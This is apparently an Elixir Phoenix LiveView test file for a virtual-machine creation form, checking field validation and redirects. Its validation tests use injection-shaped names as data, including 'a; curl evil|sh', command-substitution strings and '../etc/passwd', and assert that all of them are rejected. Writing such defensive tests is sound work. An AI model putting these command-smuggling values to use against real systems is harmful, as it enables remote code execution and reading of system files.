defmodule SpectrumPhxWeb.Vms.NewLiveTest do
  # Not async: the VM source is configured through application env, which is global.
  use SpectrumPhxWeb.ConnCase, async: false

  # Every dashboard sits behind authentication; sign the connection in.
  setup %{conn: conn}, do: %{conn: log_in(conn)}

  import Phoenix.LiveViewTest

  @valid %{
    "name" => "web-01",
    "vcpu" => "2",
    "memory" => "2048",
    "firmware" => "uefi",
    "disks" => "10G",
    "iso" => "",
    "boot_device" => "",
    "cpu_model" => "",
    "network_id" => "",
    "audio_enabled" => "false"
  }

  setup do
    # A static source means a valid submission is validated and echoed back rather than
    # written to a cluster that is not there.
    Application.put_env(:spectrum_phx, :vms_source, {:static, []})
    on_exit(fn -> Application.delete_env(:spectrum_phx, :vms_source) end)
    :ok
  end

  defp params(overrides), do: Map.merge(@valid, overrides)

  describe "form" do
    test "renders the creation form", %{conn: conn} do
      {:ok, view, html} = live(conn, ~p"/vms/new")

      assert html =~ "New virtual machine"
      assert view |> element("#vm-form") |> has_element?()
      assert view |> element("input[name='vm[name]']") |> has_element?()
      assert view |> element("input[name='vm[vcpu]']") |> has_element?()
      assert view |> element("input[name='vm[memory]']") |> has_element?()
      assert view |> element("select[name='vm[firmware]']") |> has_element?()
    end

    test "explains the naming rule up front", %{conn: conn} do
      {:ok, _view, html} = live(conn, ~p"/vms/new")

      assert html =~ "1-63 characters"
      assert html =~ "rejected"
    end
  end

  describe "inline validation" do
    test "shows a field error for an injection-shaped name", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      html = render_change(view, "validate", %{"vm" => params(%{"name" => "a; curl evil|sh"})})

      assert html =~ "must be 1-63 characters"
    end

    test "rejects every injection shape without creating anything", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      names = [
        "a; curl evil|sh",
        "a`id`",
        "a$(id)",
        "../etc/passwd",
        "a'b",
        "a\"b",
        "web-01\n",
        "-leading-hyphen",
        String.duplicate("a", 64)
      ]

      for name <- names do
        html = render_submit(view, "save", %{"vm" => params(%{"name" => name})})

        assert html =~ "must be 1-63 characters",
               "expected #{inspect(name)} to be rejected inline"

        # Still on the form: nothing was created and nothing navigated away.
        assert html =~ "New virtual machine"
      end
    end

    test "shows field errors for vcpu, memory and firmware", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      html =
        render_change(view, "validate", %{
          "vm" => params(%{"vcpu" => "0", "memory" => "64", "firmware" => "coreboot"})
        })

      assert html =~ "must be at least 1"
      assert html =~ "must be at least 128 MiB"
      assert html =~ "must be one of: uefi, bios"
    end

    test "shows a field error for an unusable disk size", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      html = render_change(view, "validate", %{"vm" => params(%{"disks" => "512M"})})

      assert html =~ "gibibytes or tebibytes"
    end

    test "reports every failing field at once", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      html =
        render_change(view, "validate", %{
          "vm" => params(%{"name" => "-bad", "vcpu" => "0", "memory" => "1", "firmware" => "x"})
        })

      assert html =~ "must be 1-63 characters"
      assert html =~ "must be at least 1"
      assert html =~ "must be at least 128 MiB"
      assert html =~ "must be one of"
    end

    test "a valid form shows no errors", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      html = render_change(view, "validate", %{"vm" => @valid})

      refute html =~ "must be 1-63 characters"
      refute html =~ "must be at least"
    end
  end

  describe "creation" do
    setup do
      # The detail page is the redirect target, so the source has to be able to answer for
      # the VM that was just created.
      created =
        Enum.map(["web-01", "db.prod", "vm_1"], fn name ->
          %SpectrumPhx.Vms.Vm{name: name, vcpu: 2, memory: 2048, disks_list: "10G"}
        end)

      Application.put_env(:spectrum_phx, :vms_source, {:static, created})
      :ok
    end

    test "a valid submission lands on the new VM's page", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      result = render_submit(view, "save", %{"vm" => @valid})

      assert {:ok, _show_view, html} = follow_redirect(result, conn)
      assert html =~ "web-01"
      assert html =~ "registered"
    end

    test "accepts the documented valid name shapes", %{conn: conn} do
      for name <- ["web-01", "db.prod", "vm_1"] do
        {:ok, view, _html} = live(conn, ~p"/vms/new")

        assert {:error, {:live_redirect, %{to: to}}} =
                 render_submit(view, "save", %{"vm" => params(%{"name" => name})}),
               "expected #{inspect(name)} to be accepted"

        assert to == "/vms/#{name}"
      end
    end

    test "a multi-disk submission is accepted", %{conn: conn} do
      {:ok, view, _html} = live(conn, ~p"/vms/new")

      assert {:error, {:live_redirect, _}} =
               render_submit(view, "save", %{"vm" => params(%{"disks" => "10G,500G:fast"})})
    end
  end
end
